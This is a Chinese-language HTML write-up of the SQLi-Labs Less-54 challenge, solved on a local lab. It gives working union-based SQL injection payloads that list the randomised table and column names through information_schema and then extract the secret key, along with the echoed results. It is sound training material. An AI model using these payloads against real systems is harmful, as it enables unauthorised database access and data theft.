@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-54 Challenge-1 随机表名联合查询 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-54 Challenge-1 随机表名联合查询 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 联合查询, Challenge</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入 Challenge 系列</li>
+        <li><strong>题目名称：</strong>Less-54 (Challenge-1)</li>
+        <li><strong>提示：</strong>目标是从 <code>challenges</code> 库中提取密钥，限制 10 次尝试，每次重置随机生成表名和列名。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡是 Challenge 系列的第一关，等同于基础的联合查询注入（单引号闭合）。</p>
+    <p><strong>核心难点：</strong>由于表名和列名是随机生成的，且有 10 次尝试限制，不能盲目猜解。必须利用 <code>information_schema</code> 系统表，第一时间获取当前库的表名与列名结构，随后精准提取目标密钥。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：获取随机表名与列名（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1' union select 1, group_concat(table_name,0x3a,column_name), 3 from information_schema.columns where table_schema='challenges' --+</code></p>
+    <p><strong>回显现象：</strong>回显 <code>l8gfnye5rg:id, l8gfnye5rg:sessid, l8gfnye5rg:secret_L786, l8gfnye5rg:tryy</code>。</p>
+    <p><strong>解释与原理：</strong>通过 <code>information_schema.columns</code> 一次查出当前随机表名（<code>l8gfnye5rg</code>）及所有列名。其中包含目标密钥列 <code>secret_L786</code>。</p>
+
+    <p><strong>第二步：提取 24 位密钥（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1' union select 1, secret_L786, 3 from challenges.l8gfnye5rg --+</code></p>
+    <p><strong>回显现象：</strong><code>Your Login name:pra824BTGoK58j3JcPTku2Ty</code>。</p>
+    <p><strong>解释与原理：</strong>利用上一步获取的真实表名和列名，直接查询目标数据，并将其放置在第 2 列回显。</p>
+
+    <p><strong>第三步：提交通关</strong></p>
+    <p>将获取到的密钥粘贴至页面底部的 <code>Submit Secret Key</code> 输入框，点击 Submit。页面弹出 <code>CONGRATS YOU NAILED IT</code>，通关成功。</p>
+
+    <h2>4. 策略复盘</h2>
+    <ul>
+        <li><strong>信息收集的高效性：</strong>面对随机生成的表名和列名，利用 <code>group_concat</code> 一次性查出所有表名和列名，极大地节省了尝试次数（仅用 2 次即完成目标）。</li>
+        <li><strong>容错机制：</strong>Challenge 系列虽然限制尝试次数，但均提供 <code>Reset the Challenge!</code> 按钮。若在实战或测试中因闭合符错误导致次数耗尽，直接重置即可重新来过。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>信息收集（Information Gathering）</strong>：在表名未知的情况下，利用系统元数据表获取结构信息是核心突破口。</li>
+        <li><strong>联合查询的高效性</strong>：在限制尝试次数的挑战中，使用 <code>group_concat</code> 一次性获取所有目标数据，往往是最优解。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
